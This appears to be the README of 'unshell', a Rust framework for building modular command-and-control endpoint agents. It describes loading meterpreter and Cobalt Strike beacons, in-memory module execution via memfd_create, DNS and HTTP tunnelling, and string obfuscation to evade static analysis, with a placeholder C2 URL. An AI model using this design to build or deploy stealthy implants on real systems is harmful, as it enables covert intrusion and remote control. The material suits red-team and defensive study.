# unshell

A fully modular, pluggable framework for building cross-platform endpoint agents that integrate with existing toolsets.

## Design Goals

- **100% Modular** - Every component is replaceable at runtime. Nothing is hardcoded.
- **Tool Integration** - Drop in Metasploit payloads, Cobalt Strike beacons, or any external implant
- **Cross-Platform** - Full Rust cross-compilation support for Windows, Linux, macOS, and embedded targets
- **Minimal Footprint** - Compile-time obfuscation and size optimization for stealthy payloads

## Philosophy

Nothing is fixed. Every part of the system is a plugin:

- **Transports** - TCP, HTTP, DNS, WebSocket, custom
- **Protocols** - Encryption, encoding, framing - all swappable
- **Payloads** - Metasploit, Cobalt Strike, custom - just load and run
- **Components** - Any Rust struct can be a module
- **Communication** - Tree-based routing with replaceable backends

## Architecture

```
unshell/
├── src/tree/           # Hierarchical message routing
│   ├── component.rs    # Component trait (implement for any module)
│   ├── endpoint.rs     # Endpoint manager
│   ├── protocols/     # Pluggable protocol stack
│   └── tcp/           # Example transport implementations
├── ush-obfuscate/     # Compile-time string obfuscation
└── ush-payload/       # Test harness
```

## Core Traits

Everything plugs into these abstractions:

### Component - Any Module

```rust
use unshell::tree::Component;
use serde_json::Value;

pub trait Component: Send + Sync {
    fn name(&self) -> &str;
    fn status(&self) -> Value;
    fn init(&mut self, config: Value) -> Result<(), String>;
    fn shutdown(&mut self) -> Result<(), String>;
}
```

### Protocol - Any Encoding Layer

```rust
use unshell::tree::protocols::Protocol;

pub trait Protocol: Send + Sync {
    fn name(&self) -> &'static str;
    fn encode(&self, data: &[u8]) -> Result<Vec<u8>, ProtocolError>;
    fn decode(&self, data: &[u8]) -> Result<Vec<u8>, ProtocolError>;
}
```

### Transport - Any Connection

```rust
// Transports connect to networks - TCP, HTTP, DNS, custom
// Implement send/recv and register with the transport registry
```

### Payload - Any External Implant

```rust
// External payloads (Metasploit, Cobalt Strike, etc.) load as components
// They expose the same interface as native components
```

## Module System

```rust
use unshell::{ModuleRuntime, Manager};
use unshell::config::RuntimeConfig;

// Define a module
pub struct MyModule;

// Implement runtime lifecycle
impl ModuleRuntime for MyModule {
    fn init(&mut self, manager: Arc<Mutex<Manager>>) -> Result<()>;
    fn is_running(&self) -> bool;
    fn kill(self: Box<Self>);
}

// Export via FFI for dynamic loading
#[unsafe(no_mangle)]
pub fn get_components() -> Vec<NamedComponent> {
    vec![NamedComponent { name: "mymodule", ... }]
}
```

Load compiled `.so`/`.dll` modules at runtime using `libloading` or in-memory via `memfd_create`.

## Protocol Stacking

Layer protocols arbitrarily:

```rust
let mut stack = ProtocolStack::new();
stack.push(&ProtocolConfig::Base64(Default::default())).unwrap();
stack.push(&ProtocolConfig::Http(Default::default())).unwrap();
stack.push(&ProtocolConfig::Tcp(Default::default())).unwrap();
```

Order determines encoding: app → base64 → http → tcp → network

## Integration Examples

### Load a Metasploit Payload

```rust
// Load precompiled Metasploit .so
let module = Module::new("meterpreter.so")?;
// Or load from raw bytes (in-memory execution)
let module = Module::new_bytes(&meterpreter_bytes)?;
```

### Use Cobalt Strike Beacon

```rust
// Beacon loads as a component with standard interface
let beacon = CobaltBeacon::new(config);
component_registry.register(Box::new(beacon)).unwrap();
// Communicate via tree messages - same as any other component
```

### Custom Transport

```rust
// Implement Protocol trait
pub struct DnsTransport { ... }
impl Protocol for DnsTransport {
    fn encode(&self, data: &[u8]) -> Result<Vec<u8>, ProtocolError> {
        // Encode as DNS TXT records
    }
    fn decode(&self, data: &[u8]) -> Result<Vec<u8>, ProtocolError> {
        // Decode DNS responses
    }
}
// Register and use
stack.push(&ProtocolConfig::Custom { name: "dns", config: ... });
```

## Cross-Compilation

```bash
# Windows x64
rustup target add x86_64-pc-windows-gnu
cargo build --target x86_64-pc-windows-gnu

# ARM64 Linux
rustup target add aarch64-unknown-linux-gnu
cargo build --target aarch64-unknown-linux-gnu

# macOS
rustup target add x86_64-apple-darwin
cargo build --target x86_64-apple-darwin
```

## Building

```bash
# Standard build (~500KB)
cargo build

# Size-optimized (~50KB)
cargo build --profile minimize

# With obfuscation
cargo build --features obfuscate
```

## Testing

```bash
cd ush-payload
cargo run
```

## Obfuscation

Compile-time string obfuscation to evade static analysis:

```rust
use ush_obfuscate::symbol;

const API_KEY: &str = symbol!("SuperSecretKey123");
const C2_URL: &str = symbol!("https://C2Server/endpoint");
```

## Roadmap

- [ ] Protocol registry for runtime registration
- [ ] Payload loader for common frameworks
- [ ] Transport abstraction layer
- [ ] Hot-swap components at runtime

## Dependencies

- `libloading` - Dynamic library loading
- `serde_json` - Serialization
- `crossbeam-channel` - Message passing
- `base64` - Encoding
- `thiserror` - Error handling

## License

MIT / Apache-2.0
